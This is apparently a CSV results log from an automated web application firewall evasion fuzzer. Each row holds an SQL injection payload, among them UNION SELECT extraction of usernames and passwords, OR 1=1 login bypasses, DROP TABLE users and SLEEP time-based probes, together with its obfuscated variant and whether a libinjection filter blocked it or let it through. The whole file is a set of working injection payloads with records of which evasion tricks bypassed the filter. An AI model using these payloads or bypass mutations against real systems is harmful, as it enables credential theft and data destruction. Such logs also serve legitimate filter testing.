depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00393,"1'
uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm/**/uSeRs--","1' uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm uSeRs--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,223,0.00594,"1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--","1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,224,0.00575,"1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs-- ","1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,223,0.00544,"1' UN/**/ION SE/**/LECT USE/**/RNAME,PASSWORD FRO/**/M USE/**/RS--","1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,223,0.00534,"1' un/**/ion se/**/lect use/**/rname,password fro/**/m use/**/rs--","1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,188,0.0054,"-1' UNIO/**/N %53%45LECT 1,2,3--","-1' UNION %53%45LECT 1,2,3--"
2,evasion_double_encode,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00574,-1%2527%2520UNION%2520%252553%252545LECT%25201%252C2%252C3--,"-1' UNION %53%45LECT 1,2,3--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00311,"-1' UNION/**/%53%45LECT 1,2,3--","-1' UNION %53%45LECT 1,2,3--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00352,"-1' UnIoN %53%45LeCt 1,2,3--","-1' UNION %53%45LECT 1,2,3--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00341,"-1' UN%49%4f%4e %53%45LE%43T 1,2,3--","-1' UNION %53%45LECT 1,2,3--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,178,0.00617,"-1'%09UNION SELE/**/CT+1,2,3--","-1'%09UNION SELECT+1,2,3--"
2,evasion_double_encode,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00578,-1%2527%252509UNION%2520SELECT%252B1%252C2%252C3--,"-1'%09UNION SELECT+1,2,3--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00375,"-1'%09UnIoN SeLeCt+1,2,3--","-1'%09UNION SELECT+1,2,3--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00334,"-1'%09U%4e%49O%4e SELECT+1,2,3--","-1'%09UNION SELECT+1,2,3--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,188,0.00497,"-1' Un/**/IoN SeLeC/**/t 1,2,3--","-1' UnIoN SeLeCt 1,2,3--"
2,evasion_double_encode,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00509,-1%2527%2520UnIoN%2520SeLeCt%25201%252C2%252C3--,"-1' UnIoN SeLeCt 1,2,3--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00405,"-1' UnIoN S%65%4c%65C%74 1,2,3--","-1' UnIoN SeLeCt 1,2,3--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00316,"-1' UnIoN%0aSeLeCt%091,2,3--","-1' UnIoN SeLeCt 1,2,3--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,188,0.00453,"-1' UNIO/**/N SELEC/**/T 1,2,3--","-1' UNIO/**/N SELEC/**/T 1,2,3--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,189,0.00509,"-1' UNIO/**/N SELEC/**/T 1,2,3-- ","-1' UNIO/**/N SELEC/**/T 1,2,3--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,188,0.0051,"-1' unio/**/n selec/**/t 1,2,3--","-1' UNIO/**/N SELEC/**/T 1,2,3--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00531,1%2520union%2520select%2520null%252Cnull,1%2520union%2520select%2520null%252Cnull
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.00573,1%2520union%2520select%2520null%252Cnull ,1%2520union%2520select%2520null%252Cnull
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00504,1%2520UNION%2520SELECT%2520NULL%252CNULL,1%2520union%2520select%2520null%252Cnull
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.0056,1%2520union%2520select%2520null%252cnull,1%2520union%2520select%2520null%252Cnull
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4631,0.00504,1%2520%252575%25256eio%25256e%2520%252573elect%2520n%252575%25256cl%252Cn%252575%25256c%25256c,"1 %75%6eio%6e %73elect n%75%6cl,n%75%6c%6c"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00314,"1+%75%6eio%6e
%73elect n%75%6cl,n%75%6c%6c","1 %75%6eio%6e %73elect n%75%6cl,n%75%6c%6c"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00336,"1 %75%6eIo%6E %73eLeCt n%75%6cL,N%75%6C%6c","1 %75%6eio%6e %73elect n%75%6cl,n%75%6c%6c"
2,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4595,0.00513,"1 %75%6%65io%6e %73e%6c%65%63t n%75%6%63%6c,%6e%75%6%63%6c","1 %75%6eio%6e %73elect n%75%6cl,n%75%6c%6c"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00585,"1
unio/**/n+sel/**/ect nul/**/l,n/**/ull","1
union+select null,null"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.0059,1%250Aunion%252Bselect%2520null%252Cnull,"1
union+select null,null"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00312,"1
UnIoN+SeLeCt nUlL,NuLl","1
union+select null,null"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00347,"1
%75%6e%69on+select n%75l%6c,%6e%75ll","1
union+select null,null"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.003,"1
union+select+null,null","1
union+select null,null"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00555,"1 UnI/**/oN SeLe/**/Ct n/**/UlL,NuL/**/l","1 UnIoN SeLeCt nUlL,NuLl"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00537,1%2520UnIoN%2520SeLeCt%2520nUlL%252CNuLl,"1 UnIoN SeLeCt nUlL,NuLl"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00343,"1 UnI%6f%4e %53eLe%43t n%55%6cL,NuLl","1 UnIoN SeLeCt nUlL,NuLl"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00334,"1%09UnIoN%0aSeLeCt nUlL,NuLl","1 UnIoN SeLeCt nUlL,NuLl"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00535,"1 u/**/nion selec/**/t nu/**/ll,nu/**/ll","1 u/**/nion selec/**/t nu/**/ll,nu/**/ll"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.00578,"1 u/**/nion selec/**/t nu/**/ll,nu/**/ll ","1 u/**/nion selec/**/t nu/**/ll,nu/**/ll"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00562,"1 U/**/NION SELEC/**/T NU/**/LL,NU/**/LL","1 u/**/nion selec/**/t nu/**/ll,nu/**/ll"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00516,admin'--,admin'--
2,stability_probe,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00541,admin'-- ,admin'--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00523,ADMIN'--,admin'--
2,stability_probe,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00516,ADMIN'-- ,ADMIN'--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,162,0.00529,admin'/*,admin'/*
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,163,0.00508,admin'/* ,admin'/*
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,162,0.00577,ADMIN'/*,admin'/*
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,164,0.00491,admin'/*  ,admin'/* 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,163,0.00504,ADMIN'/* ,admin'/* 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00465,' OR 1=1--,' OR 1=1--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00514,' OR 1=1-- ,' OR 1=1--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00551,' or 1=1--,' OR 1=1--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00537,' OR 1=1--  ,' OR 1=1-- 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00498,' or 1=1-- ,' OR 1=1-- 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4811,0.00523,' OR 1=1#,' OR 1=1#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4816,0.00542,' OR 1=1# ,' OR 1=1#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4811,0.00498,' or 1=1#,' OR 1=1#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00544,' OR 1=1#  ,' OR 1=1# 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4816,0.00503,' or 1=1# ,' OR 1=1# 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00491,1' OR '1'='1'--,1' OR '1'='1'--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00522,1' OR '1'='1'-- ,1' OR '1'='1'--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00521,1' or '1'='1'--,1' OR '1'='1'--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4851,0.00564,1' OR '1'='1'--  ,1' OR '1'='1'-- 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00493,1' or '1'='1'-- ,1' OR '1'='1'-- 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00503,1' OR '1'='1'#,1' OR '1'='1'#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4841,0.00496,1' OR '1'='1'# ,1' OR '1'='1'#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00503,1' or '1'='1'#,1' OR '1'='1'#
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00525,1' OR '1'='1'#  ,1' OR '1'='1'# 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4841,0.00522,1' or '1'='1'# ,1' OR '1'='1'# 
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00508,1%253B%2520DROP%2520TABLE%2520users--,1%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4575,0.00505,1%253B%2520DROP%2520TABLE%2520users-- ,1%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.0058,1%253B%2520DROP%2520TABLE%2520USERS--,1%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00563,1%253b%2520drop%2520table%2520users--,1%253B%2520DROP%2520TABLE%2520users--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4610,0.00572,1%253B%2520D%252552OP%2520TA%252542%25254c%252545%2520u%252573e%252572s--,1; D%52OP TA%42%4c%45 u%73e%72s--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00303,1;	D%52OP TA%42%4c%45%09u%73e%72s--,1; D%52OP TA%42%4c%45 u%73e%72s--
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00315,1; d%52oP Ta%42%4c%45 U%73E%72S--,1; D%52OP TA%42%4c%45 u%73e%72s--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00313,1; D%52O%50 TA%42%4c%45 u%73%65%72s--,1; D%52OP TA%42%4c%45 u%73e%72s--
2,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00331,"1; DROP
TABLE/**/u/**/sers--","1; DROP
TABLE/**/users--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4581,0.00532,1%253B%2520DROP%250ATABLE/%252A%252A/users--,"1; DROP
TABLE/**/users--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00349,"1; dRoP
TaBlE/**/uSeRs--","1; DROP
TABLE/**/users--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00333,"1; %44%52%4fP
%54%41%42%4cE/**/u%73%65rs--","1; DROP
TABLE/**/users--"
2,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00382,1; dRoP TaBlE Us/**/ErS--,1; dRoP TaBlE UsErS--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00539,1%253B%2520dRoP%2520TaBlE%2520UsErS--,1; dRoP TaBlE UsErS--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,1; dR%6fP T%61B%6cE UsErS--,1; dRoP TaBlE UsErS--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00342,1;	dRoP TaBlE UsErS--,1; dRoP TaBlE UsErS--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4586,0.00589,1%253B%2520DROP%2520TABLE%2520u/%252A%252A/sers--,1; DROP TABLE u/**/sers--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00353,1; D%52%4fP T%41%42%4cE u/**/sers--,1; DROP TABLE u/**/sers--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00384,1;/**/DROP TABLE+u/**/sers--,1; DROP TABLE u/**/sers--
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.003,1; dRoP TaBlE U/**/sErS--,1; DROP TABLE u/**/sers--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00522,1%2527%253B%2520DROP%2520TABLE%2520users--,1%2527%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4580,0.00551,1%2527%253B%2520DROP%2520TABLE%2520users-- ,1%2527%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00541,1%2527%253B%2520DROP%2520TABLE%2520USERS--,1%2527%253B%2520DROP%2520TABLE%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00634,1%2527%253b%2520drop%2520table%2520users--,1%2527%253B%2520DROP%2520TABLE%2520users--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4615,0.00569,1%2527%253B%2520DR%25254f%252550%2520T%252541%252542LE%2520%252575s%252565rs--,1'; DR%4f%50 T%41%42LE %75s%65rs--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00415,1';%09DR%4f%50 T%41%42LE %75s%65rs--,1'; DR%4f%50 T%41%42LE %75s%65rs--
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00289,1'; Dr%4F%50 t%41%42Le %75S%65Rs--,1'; DR%4f%50 T%41%42LE %75s%65rs--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00421,1'; D%52%4f%50 T%41%42LE %75%73%65%72%73--,1'; DR%4f%50 T%41%42LE %75s%65rs--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4581,0.00497,1%2527%253B%250ADROP%252BTABLE%25250ausers--,"1';
DROP+TABLE%0ausers--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00361,"1';
DrOp+tAbLe%0AuSeRs--","1';
DROP+TABLE%0ausers--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0036,"1';
D%52%4fP+%54%41BLE%0%61us%65%72s--","1';
DROP+TABLE%0ausers--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00555,1%2527%253B%2520DrOp%2520tAbLe%2520uSeRs--,1'; DrOp tAbLe uSeRs--
2,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00355,1'; DrOp tAbLe u/**/SeRs--,1'; DrOp tAbLe uSeRs--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00344,1'; D%72Op %74AbLe uS%65R%73--,1'; DrOp tAbLe uSeRs--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0033,1'; DrOp	tAbLe/**/uSeRs--,1'; DrOp tAbLe uSeRs--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4591,0.00552,1%2527%253B%2520DROP%2520TABLE%2520u/%252A%252A/sers--,1'; DROP TABLE u/**/sers--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00425,1'; %44%52OP %54ABLE u/**/%73ers--,1'; DROP TABLE u/**/sers--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00355,1'; DROP TABLE/**/u/**/sers--,1'; DROP TABLE u/**/sers--
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00394,1'; DrOp tAbLe u/**/SeRs--,1'; DROP TABLE u/**/sers--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4567,0.00513,1%2520AND%2520SLEEP%25285%2529,1%2520AND%2520SLEEP%25285%2529
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4568,0.0051,1%2520AND%2520SLEEP%25285%2529 ,1%2520AND%2520SLEEP%25285%2529
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4567,0.00581,1%2520and%2520sleep%25285%2529,1%2520AND%2520SLEEP%25285%2529
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4591,0.00519,1%2520%252541N%252544%2520%252553LEE%252550%25285%2529,1 %41N%44 %53LEE%50(5)
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00335,1/**/%41N%44 %53LEE%50(5),1 %41N%44 %53LEE%50(5)
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,1 %41n%44 %53lEe%50(5),1 %41N%44 %53LEE%50(5)
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00312,1 %41N%44 %53%4cE%45%50(5),1 %41N%44 %53LEE%50(5)
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4569,0.00611,1%2509AND%25250aSLEEP%25285%2529,1	AND%0aSLEEP(5)
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4557,0.00509,1	AN/**/D%0aSLEEP(5),1	AND%0aSLEEP(5)
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00305,1	AnD%0aSlEeP(5),1	AND%0aSLEEP(5)
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00331,1	AND%0a%53L%45EP(5),1	AND%0aSLEEP(5)
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4567,0.00548,1%2520AnD%2520SlEeP%25285%2529,1 AnD SlEeP(5)
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4559,0.00541,1 An/**/D S/**/lEeP(5),1 AnD SlEeP(5)
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00405,1 A%6eD SlEe%50(5),1 AnD SlEeP(5)
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00398,1 AnD+SlEeP(5),1 AnD SlEeP(5)
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4559,0.00784,1 AN/**/D SL/**/EEP(5),1 AN/**/D SL/**/EEP(5)
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4560,0.00587,1 AN/**/D SL/**/EEP(5) ,1 AN/**/D SL/**/EEP(5)
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4559,0.00606,1 an/**/d sl/**/eep(5),1 AN/**/D SL/**/EEP(5)
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00704,1%2527%2520AND%2520SLEEP%25285%2529--,1%2527%2520AND%2520SLEEP%25285%2529--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4575,0.00471,1%2527%2520AND%2520SLEEP%25285%2529-- ,1%2527%2520AND%2520SLEEP%25285%2529--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.0057,1%2527%2520and%2520sleep%25285%2529--,1%2527%2520AND%2520SLEEP%25285%2529--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4586,0.00627,1%2527%2520%252541ND%2520S%25254cEEP%25285%2529--,1' %41ND S%4cEEP(5)--
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00374,1'/**/%41ND S%4cEEP(5)--,1' %41ND S%4cEEP(5)--
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00448,1' %41Nd s%4CeEp(5)--,1' %41ND S%4cEEP(5)--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00388,1' %41ND %53%4c%45EP(5)--,1' %41ND S%4cEEP(5)--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.0065,1%2527%252BAND%250ASLEEP%25285%2529--,"1'+AND
SLEEP(5)--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,176,0.00506,"1'+AN/**/D
S/**/LEEP(5)--","1'+AND
SLEEP(5)--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00339,"1'+aNd
sLeEp(5)--","1'+AND
SLEEP(5)--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00549,"1'+AN%44
%53%4c%45EP(5)--","1'+AND
SLEEP(5)--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00561,1%2527%2520aNd%2520sLeEp%25285%2529--,1' aNd sLeEp(5)--
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,182,0.00546,1' aN/**/d sL/**/eEp(5)--,1' aNd sLeEp(5)--
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,1' aN%64 sL%65E%70(5)--,1' aNd sLeEp(5)--
